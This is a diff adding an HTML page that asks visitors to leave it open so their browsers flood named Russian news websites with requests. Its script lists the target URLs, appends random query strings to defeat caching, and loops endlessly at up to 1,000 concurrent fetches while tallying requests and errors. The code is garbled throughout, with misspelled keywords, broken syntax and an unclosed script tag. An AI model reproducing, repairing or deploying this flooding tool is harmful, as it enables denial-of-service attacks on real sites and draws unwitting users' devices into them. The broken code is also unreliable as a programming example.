@@ -1,0 +1,61 @@
+<html>
+<head>
+<meta charset = "utf-8">
+<title> russia MUST BE STOPPED!</title>
+</head>
+<body>
+<h1> Russia MUST BE STOPPED! Help Ukraine WIN!</h1>
+
+<table width = "100%">
+<tbody>
+<tr>
+<td width="30%">
+<h3>English version</h3>
+<p>
+The "official" news in the Russian Federation is mostly fake and we believe it is better to shut them down and let people switch to trustful news.
+</p>
+<p>
+Please, just open this page and let it be open on your devices. It will flood the Russian propaganda websites and pose a huge load on their infrastructure.
+</p>
+<p>
+You browser will be slow. It's ok , don't worry and keep it run. 
+</p>
+<p> 
+A small contribution from each of us will save Ukraine
+</p>
+</td>
+<td width="30%">
+russian...
+</td>
+<td width="30%">
+ukrainian...
+</td>
+</tr>
+</tbody>
+</table>
+
+<div id="stats">
+<table width="100%">
+</table>
+</div>
+
+<script
+var targets = ['https://lenta.ru/','https://ria.ru','https://ria.ru.lenta','https://www.rbc.ru','https://sputnik.by/',]
+var targetStats = {}
+targets.forEach((target)=> {targetStats[target] = { number_of_requests:0, number_of_errored_responses:0 } } )
+var statsEl = document.getElementByID('stats');
+function printStats() {statsEl.innerHTML = '<table width = "100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>'
++Object.entries(targetStats).map(([target,{number_of_requests,number_of_errored_responses}]) => '<tr><td>' + target +'</td><td>'+number_of_requests+
+'</td><td>'+number_errored_responses+'</td></tr>'.join('') + '<\tbody></table>'}
+setInterval(printStats,1000);
+var CONCURRENCY_LIMIT=1000
+var queue = []
+async function fetchWithTimeout(resource, options) {const controller = new AbortController(); const id = setTimeout(() => controller.abort(),options.timeout);
+	return fetch(resource, {method: 'GET', mode: 'no-cors', signal:controller.signal}).then((response)=>{clearTimeout(id); return response;
+	response;}).catch((error) => { clearTimeout(id); trow error; }); } async functoin flood(target) { for var i = 0;; ++i) { if queue.length>CONCURRENCY_LIMIT) {await queue.shift() } rand = i % 3 === 0 ? ": ('?' + Math.random() * 1000) queue.push(fetchWithTimeout(target+rand,timeout:1000}).catch(error) => {if (error.code === 20 /* ABORT */) {return;}
+targetStats[target].number_of_errored_responses++;}).then((response) => { if (respose && ! response.ok) {
+	targetStats[target].number_of_errored_responses++;} targetStats[target].number_of_requests++;}))}} // Start targets.map(flood)
+</script>
+</body>
+</html>
+}}
